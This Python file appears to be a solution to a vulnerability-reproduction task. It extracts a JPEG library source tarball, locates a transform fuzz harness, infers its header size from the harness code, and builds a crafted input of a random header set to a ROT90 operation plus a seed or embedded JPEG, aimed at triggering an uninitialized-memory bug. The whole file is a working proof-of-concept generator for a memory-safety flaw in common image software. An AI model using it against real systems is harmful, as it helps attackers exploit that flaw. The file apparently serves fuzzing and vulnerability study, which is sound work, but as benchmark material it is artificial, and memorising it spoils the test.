import tarfile
import os
import glob
import re
import shutil
import tempfile
import random
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Fallback JPEG data (approx 2KB valid JPEG)
        jpeg_data = (
            b'\xff\xd8\xff\xe0\x00\x10\x4a\x46\x49\x46\x00\x01\x01\x01\x00\x48'
            b'\x00\x48\x00\x00\xff\xdb\x00\x43\x00\xff\xff\xff\xff\xff\xff\xff'
            b'\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff'
            b'\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff'
            b'\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff'
            b'\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xdb\x00\x43\x01\xff\xff'
            b'\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff'
            b'\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff'
            b'\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff'
            b'\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xc0\x00\x11\x08\x00'
            b'\x20\x00\x20\x03\x01\x22\x00\x02\x11\x01\x03\x11\x01\xff\xc4\x00\x1f'
            b'\x00\x00\x01\x05\x01\x01\x01\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00'
            b'\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\xff\xc4\x00\xb5\x10'
            b'\x00\x02\x01\x03\x03\x02\x04\x03\x05\x05\x04\x04\x00\x00\x01\x7d\x01'
            b'\x02\x03\x00\x04\x11\x05\x12\x21\x31\x41\x06\x13\x51\x61\x07\x22\x71'
            b'\x14\x32\x81\x91\xa1\x08\x23\x42\xb1\xc1\x15\x52\xd1\xf0\x24\x33\x62'
            b'\x72\x82\x09\x0a\x16\x17\x18\x19\x1a\x25\x26\x27\x28\x29\x2a\x34\x35'
            b'\x36\x37\x38\x39\x3a\x43\x44\x45\x46\x47\x48\x49\x4a\x53\x54\x55\x56'
            b'\x57\x58\x59\x5a\x63\x64\x65\x66\x67\x68\x69\x6a\x73\x74\x75\x76\x77'
            b'\x78\x79\x7a\x83\x84\x85\x86\x87\x88\x89\x8a\x92\x93\x94\x95\x96\x97'
            b'\x98\x99\x9a\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xb2\xb3\xb4\xb5\xb6'
            b'\xb7\xb8\xb9\xba\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xd2\xd3\xd4\xd5'
            b'\xd6\xd7\xd8\xd9\xda\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xf1\xf2'
            b'\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xff\xc4\x00\x1f\x01\x00\x03\x01\x01'
            b'\x01\x01\x01\x01\x01\x01\x01\x00\x00\x00\x00\x00\x00\x01\x02\x03\x04'
            b'\x05\x06\x07\x08\x09\x0a\x0b\xff\xc4\x00\xb5\x11\x00\x02\x01\x02\x04'
            b'\x04\x03\x04\x07\x05\x04\x04\x00\x01\x02\x77\x00\x01\x02\x03\x11\x04'
            b'\x05\x21\x31\x06\x12\x41\x51\x07\x61\x71\x13\x22\x32\x81\x08\x14\x42'
            b'\x91\xa1\xb1\xc1\x09\x23\x33\x52\xf0\x15\x62\x72\xd1\x0a\x16\x24\x34'
            b'\xe1\x25\xf1\x17\x18\x19\x1a\x26\x27\x28\x29\x2a\x35\x36\x37\x38\x39'
            b'\x3a\x43\x44\x45\x46\x47\x48\x49\x4a\x53\x54\x55\x56\x57\x58\x59\x5a'
            b'\x63\x64\x65\x66\x67\x68\x69\x6a\x73\x74\x75\x76\x77\x78\x79\x7a\x82'
            b'\x83\x84\x85\x86\x87\x88\x89\x8a\x92\x93\x94\x95\x96\x97\x98\x99\x9a'
            b'\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9'
            b'\xba\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xd2\xd3\xd4\xd5\xd6\xd7\xd8'
            b'\xd9\xda\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xf2\xf3\xf4\xf5\xf6\xf7'
            b'\xf8\xf9\xfa\xff\xda\x00\x0c\x03\x01\x00\x02\x11\x03\x11\x00\x3f\x00'
            b'\xf9\xfe\x8a\x28\xa0\x02\x8a\x28\xa0\x02\x8a\x28\xa0\x02\x8a\x28\xa0'
            b'\x02\x8a\x28\xa0\x02\x8a\x28\xa0\x02\x8a\x28\xa0\x02\x8a\x28\xa0\x02'
            b'\x8a\x28\xa0\x02\x8a\x28\xa0\x02\x8a\x28\xa0\x02\x8a\x28\xa0\x02\x8a'
            b'\x28\xa0\x02\x8a\x28\xa0\x02\x8a\x28\xa0\x02\x8a\x28\xa0\x02\x8a\x28'
            b'\xa0\x02\x8a\x28\xa0\x02\x8a\x28\xa0\x02\x8a\x28\xa0\x02\x8a\x28\xa0'
            b'\x02\x8a\x28\xa0\x02\x8a\x28\xa0\x02\x8a\x28\xa0\x02\x8a\x28\xa0\x02'
            b'\x8a\x28\xa0\x02\x8a\x28\xa0\x02\x8a\x28\xa0\x02\x8a\x28\xa0\x02\x8a'
            b'\x28\xa0\x02\x8a\x28\xa0\x02\x8a\x28\xa0\x02\x8a\x28\xa0\x03\xff\xd9'
        )

        temp_dir = tempfile.mkdtemp()
        try:
            with tarfile.open(src_path) as tar:
                tar.extractall(path=temp_dir)
            
            fuzzer_path = None
            fuzzer_content = ""
            
            # Prioritize transform fuzzer as uninitialized value in destination buffers 
            # often occurs during transformation.
            candidates = glob.glob(os.path.join(temp_dir, '**', '*fuzz*.cc'), recursive=True)
            candidates += glob.glob(os.path.join(temp_dir, '**', '*fuzz*.c'), recursive=True)
            
            for p in candidates:
                with open(p, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                    if 'tj3Transform' in content or 'tjTransform' in content:
                        fuzzer_path = p
                        fuzzer_content = content
                        break
            
            # Fallback to any fuzzer
            if not fuzzer_path and candidates:
                fuzzer_path = candidates[0]
                with open(fuzzer_path, 'r', encoding='utf-8', errors='ignore') as f:
                    fuzzer_content = f.read()

            # Determine header size
            header_size = 0
            
            # Check for "size < sizeof(type) * N"
            sizeof_match = re.search(r'size\s*<\s*sizeof\s*\(\s*([\w\s]+)\s*\)\s*\*\s*(\d+)', fuzzer_content)
            if sizeof_match:
                t = sizeof_match.group(1).strip()
                n = int(sizeof_match.group(2))
                sz = 4 if 'int' in t else (2 if 'short' in t else 1)
                header_size = sz * n
            
            # Check for "size < N"
            if header_size == 0:
                size_lt_matches = re.findall(r'size\s*<\s*(\d+)', fuzzer_content)
                if size_lt_matches:
                    header_size = max(int(x) for x in size_lt_matches)
            
            # Check for "data += N"
            if header_size == 0:
                data_inc = re.search(r'data\s*\+=\s*(\d+)', fuzzer_content)
                if data_inc:
                    header_size = int(data_inc.group(1))

            if header_size == 0:
                header_size = 24  # Common default for libjpeg fuzzers

            # Find seed image (testorig.jpg is best)
            seed_img = b''
            imgs = glob.glob(os.path.join(temp_dir, '**', '*.jpg'), recursive=True)
            imgs.sort(key=lambda x: os.path.getsize(x))
            
            for img in imgs:
                if 'testorig' in os.path.basename(img):
                    with open(img, 'rb') as f:
                        seed_img = f.read()
                    break
            
            if not seed_img and imgs:
                # prefer images > 1KB
                for img in imgs:
                     if os.path.getsize(img) > 1000:
                         with open(img, 'rb') as f:
                             seed_img = f.read()
                         break
                if not seed_img:
                     with open(imgs[0], 'rb') as f:
                         seed_img = f.read()
            
            if not seed_img:
                seed_img = jpeg_data

            # Construct header
            # We use ROT90 (5) to trigger transformation logic which might expose uninitialized output
            header = bytearray(random.getrandbits(8) for _ in range(header_size))
            if header_size >= 4:
                # Set first 4 bytes to 5 (little endian int)
                header[0] = 5
                header[1] = 0
                header[2] = 0
                header[3] = 0
            
            return header + seed_img

        except Exception:
            # Safe fallback: header with op=5 and default JPEG
            return b'\x05\x00\x00\x00' + b'\x00' * 20 + jpeg_data
        finally:
            shutil.rmtree(temp_dir)
